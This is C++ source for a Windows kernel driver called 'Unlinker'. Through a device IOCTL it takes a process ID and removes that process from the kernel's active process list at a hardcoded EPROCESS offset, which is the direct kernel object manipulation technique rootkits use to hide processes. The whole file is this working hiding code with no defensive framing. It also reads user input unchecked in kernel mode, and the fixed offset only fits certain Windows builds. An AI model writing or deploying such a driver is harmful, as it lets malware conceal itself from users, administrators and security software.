#pragma warning(disable: 4996)
#include <ntifs.h>
#include <ntddk.h>
#include <aux_klib.h>
#include "IOCTLs.h"
#include "Common.h"

void DriverCleanup(PDRIVER_OBJECT DriverObject);

NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Unlinker");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\Unlinker");


extern "C"
NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint(("[+] Unlinker::DriverEntry called!\n"));
	DriverObject->DriverUnload = DriverCleanup;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;

	PDEVICE_OBJECT deviceObject;

	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&deviceObject
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[!] Unlinker::Failed to create Device Object (0x%08X)\n", status);
		return status;
	}

	status = IoCreateSymbolicLink(&symlink, &deviceName);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[!] Unlinker::Failed to create symlink (0x%08X)\n", status);
		IoDeleteDevice(deviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}


NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR length = 0;

	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case UNLINKER_HIDDEN_PROCESS:
	{
		DbgPrint(("[+] Unlinker::UNLINKER_HIDDEN_PROCESS requested!\n"));
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(InputParameters))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			DbgPrint("[!] Unlinker::STATUS_BUFFER_TOO_SMALL\n");
			break;
		}
		else {
			DbgPrint(("[+] Unlinker::STATUS_BUFFER_TOO_SMALL::passed\n"));
		}
		InputParameters* input = (InputParameters*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (input == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			DbgPrint(("[!] Unlinker::STATUS_INVALID_PARAMETER\n"));
			break;
		}
		else {
			DbgPrint(("[+] Unlinker::STATUS_INVALID_PARAMETER::passed\n"));
		}

 		PEPROCESS eProcess = NULL;
		status = PsLookupProcessByProcessId((HANDLE)input->pid, &eProcess);

		if (!NT_SUCCESS(status)) {
			DbgPrint("[!] Unlinker::Failed to look for process by id (0x%08X)\n", status);
			break;
		}
		else {
			DbgPrint(("[+] Unlinker::PsLookupProcessByProcessId::passed\n"));
		}

		LIST_ENTRY* activeProcessList = (LIST_ENTRY*)(((ULONG_PTR)eProcess) + 0x448);

		if (!activeProcessList) {
			DbgPrint("[!] Unlinker::Failed to look activeProcessList\n");
			ObDereferenceObject(eProcess);
			status = STATUS_UNSUCCESSFUL;
			break;
		} else {
			DbgPrint(("[+] Unlinker::activeProcessList::passed\n"));
		}

		
		if (activeProcessList->Flink == activeProcessList && activeProcessList->Blink == activeProcessList) {
			ObDereferenceObject(eProcess);
			status = STATUS_ALREADY_COMPLETE;
			break;
		}
		else {
			DbgPrint(("[+] Unlinker::STATUS_ALREADY_COMPLETE::passed\n"));
		}

		LIST_ENTRY* prevProcess = activeProcessList->Blink;
		LIST_ENTRY* nextProcess = activeProcessList->Flink;

		prevProcess->Flink = nextProcess;
		nextProcess->Blink = prevProcess;

		activeProcessList->Blink = activeProcessList;
		activeProcessList->Flink = activeProcessList;

		ObDereferenceObject(eProcess);

		break;
	}
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		DbgPrint("[!] Unlinker::STATUS_INVALID_DEVICE_REQUEST\n");
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = length;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}


NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	DbgPrint("[+] Unlinker::CreateClose called\n");
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


void DriverCleanup(PDRIVER_OBJECT DriverObject)
{
	DbgPrint("[+] Unlinker::DriverCleanup called\n");
	IoDeleteSymbolicLink(&symlink);
	IoDeleteDevice(DriverObject->DeviceObject);
}